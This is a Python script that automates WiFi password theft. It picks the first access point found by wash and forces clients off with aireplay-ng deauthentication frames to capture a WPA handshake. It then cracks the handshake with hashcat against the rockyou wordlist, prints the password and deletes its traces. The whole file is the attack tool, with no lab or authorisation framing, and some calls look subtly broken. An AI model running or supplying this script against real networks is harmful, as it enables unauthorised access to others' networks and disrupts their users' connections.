import os
import subprocess
import sys
from tqdm import tqdm

iface = "*enter you wifi interface here*"
wordlist = "/usr/share/wordlists/rockyou.txt"
timeout = "10"
deauth_count = "10"
segment_size = 100000
threads = 4
capture_time = 5

def find_wifi_info():
    result = subprocess.run(["wash", "-i", iface], stdout=subprocess.PIPE)
    wifi_info = result.stdout.decode().split("\n")[1]
    bssid, channel = wifi_info.split()[:2]
    return bssid, channel

def capture_handshake(bssid, channel):
    handshake_file = f"capture-{bssid}"
    hash_file = f"hash-{bssid}"
    airodump = subprocess.Popen(["airodump-ng", "--bssid", bssid, "--channel", channel, "-w", handshake_file, "--uptime", str(capture_time), iface], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    aireplay = subprocess.Popen(["aireplay-ng", "--deauth", str(deauth_count), "-a", bssid, iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["sleep", timeout])
    subprocess.run(["kill", airodump.pid])
    return handshake_file, hash_file

def extract_hash(handshake_file, hash_file):
    subprocess.run(["aircrack-ng", "-J", hash_file, "-b", bssid, f"{handshake_file}-01.cap"])

def crack_password(hash_file):
    total_length = int(subprocess.run(["wc", "-l", wordlist], stdout=subprocess.PIPE).stdout.decode().split()[0])
    segments = (total_length // segment_size) + 1
    jobs = []
    for i in range(1, segments + 1):
        start = (i - 1) * segment_size
        length = segment_size
        if i == segments:
            length = total_length - start
        p = subprocess.Popen(["hashcat", "-m", "2500", "-a", "0", "-s", str(start), "-l", str(length), "--force", "--quiet", "--gpu-temp-retain=80", "--gpu-temp-abort=90", "-w", str(threads), f"{hash_file}.hccapx", wordlist], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        jobs.append(p)
    for p in jobs:
        p.wait()

    password = None
    with tqdm(total=total_length, desc="Cracking Password", unit="word") as progress:
        for line in subprocess.Popen(["hashcat", "--show", f"{hash_file}.hccapx"], stdout=subprocess.PIPE).stdout:
            line = line.decode("utf-8").strip()
            if ":" in line:
                h, p = line.split(":")
                password = p
                break
            progress.update(1)
    return password

def cleanup():
    subprocess.run(["ifconfig", iface, "down"])
    subprocess.run(["iwconfig", iface, "mode", "managed"])
    subprocess.run(["ifconfig", iface, "up"])

if os.geteuid() != 0:
    exit(1)

bssid, channel = find_wifi_info()
handshake_file, hash_file = capture_handshake(bssid, channel)
extract_hash(handshake_file, hash_file)
password = crack_password(hash_file)

os.remove(f"{handshake_file}-01.cap")
os.remove(f"{hash_file}.hccapx")
os.remove(f"{hash_file}.potfile")

if password:
    print(password)

cleanup()
